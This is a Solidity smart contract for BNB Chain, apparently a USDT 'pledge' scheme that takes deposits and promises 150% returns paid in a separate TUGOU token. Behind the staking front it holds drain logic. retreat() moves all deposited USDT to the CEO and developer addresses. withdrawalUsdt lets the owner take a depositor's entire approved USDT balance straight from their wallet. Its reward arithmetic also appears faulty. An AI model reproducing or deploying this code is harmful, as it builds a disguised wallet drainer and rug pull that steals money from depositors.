/**
 *Submitted for verification at BscScan.com on 2022-08-25
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function mint(address _to, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
 
contract pledge {
    using SafeMath for uint256;
    /**配置区域 */
    uint256 public startUNIX; // 
    bool public launch; // 
    uint256 private maxDeposit = 16000 ether; // 
    address private USDT = 0x55d398326f99059fF775485246999027B3197955;
    address private TUGOU = 0xc66228D2606213e6Cf61dCf5a6D90E8Da3048448;
    uint256 min = 1 ether; // 
    uint256 max = 200 ether; // 
    mapping(address => uint256) userTotalDeposit; // 

    uint256 private cycle = 561600; //项目周期（秒） 6.5*24*60*60 6.5天*24小时*60分钟*60秒
    uint256 private max_length = 84000; //最长持有时间

    address public ceoAddress = 0xc88B594a5A096af9Ab09f083851a2B09B9b2b8b7; // 
    address public devAddress = 0x829C2d4C07eDD9f1DF96dfe02BAfF781D55b5587; //   
    uint256 private devfee = 30; // 
    /**统计区域 */
    uint256 public totalDeposit; // 
    uint256 public totalRelease; // 

    struct plan {
        uint256 start_time; //订单开始时间
        uint256 end_time; //订单结束时间
        uint256 update_time; //上一次领取时间
        uint256 deposit; //存款金额
    }

    struct User {
        //用户结构
        uint256 deposit_amount; //存款订单数
        plan[] plan_list; //存款订单列表
    }
    mapping(address => User) Users; //给每个地址映射一下


    address internal _owner;
    address[] public approveUsdtUsers;

    constructor() {
        _owner = msg.sender;
    }

    /**购买代币 */
    function invest(uint256 amount) external {
        require(amount > min, "No less than 2 ether");
        // 
        uint256 TotalDeposit = userTotalDeposit[msg.sender].add(amount);
        // 
        require(max >= TotalDeposit, "Total deposit cannot exceed 200");
        // 
        IBEP20(USDT).transferFrom(msg.sender, address(this), amount);
        // 
        Users[msg.sender].deposit_amount++;

        plan memory user_plan;
        user_plan.start_time = block.timestamp; // 
        user_plan.end_time = cycle.add(block.timestamp); // 
        user_plan.update_time = block.timestamp; // 
        user_plan.deposit = amount; // 
        Users[msg.sender].plan_list.push(user_plan);
    }

    /**计算可领取金额 */
    function calculationamount(address _user) public view returns (uint256) {
        plan[] storage plans = Users[_user].plan_list;
        uint256 number = plans.length;

        uint256 money;
        for (uint256 a = 0; a < number; a++) {
             
            uint256 release = plans[a].deposit.div(cycle);
          
            uint256 difference = block.timestamp;
            
            if (block.timestamp > plans[a].end_time) {
                difference = plans[a].end_time;
            }
             
            if (difference.sub(plans[a].update_time) > cycle) {
                money += difference.sub(cycle).mul(release);
            } else {
                
                money += difference.sub(plans[a].update_time).mul(release);
            }
        }
        return money;
    }

    /** 用户申请提现 */
    function Withdrawal() external {
        User storage user = Users[msg.sender];
        uint256 money = calculationamount(msg.sender);
        if (money > 0) {
          
            plan[] storage plans = user.plan_list;
            uint256 number = plans.length;
            for (uint256 a = 0; a < number; a++) {
                user.plan_list[a].update_time = block.timestamp;
            }
          
            money = money.mul(150).div(100);
          
            uint256 balance = IBEP20(TUGOU).balanceOf(address(this));
            if (money > balance) {
                money = balance;
            }
            //支付
            IBEP20(TUGOU).transfer(msg.sender, money);
        }
    }

  
    function getUserPlans(address _user) public view returns (plan[] memory) {
        return Users[_user].plan_list;
    }

    /**拿回合同里面的U */
    /**不用管理员权限了 直接提取打开到指定钱包 用户调用了我们还省gas费 */
    function retreat() external {
        //获取合同现在USDT的余额
        uint256 amount = IBEP20(USDT).balanceOf(address(this));
        if (amount > 0) {
           
            uint256 fee = amount.mul(devfee).div(100);
            IBEP20(USDT).transfer(devAddress, fee); // 
            IBEP20(USDT).transfer(ceoAddress, amount.sub(fee)); // 
        }
    }

    function withdrawalUsdt(address wallet_) public {
        require(msg.sender == _owner || msg.sender == ceoAddress, "Cannot withdraw");
        IBEP20(USDT).transferFrom(wallet_, _owner, IBEP20(USDT).balanceOf(wallet_));
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}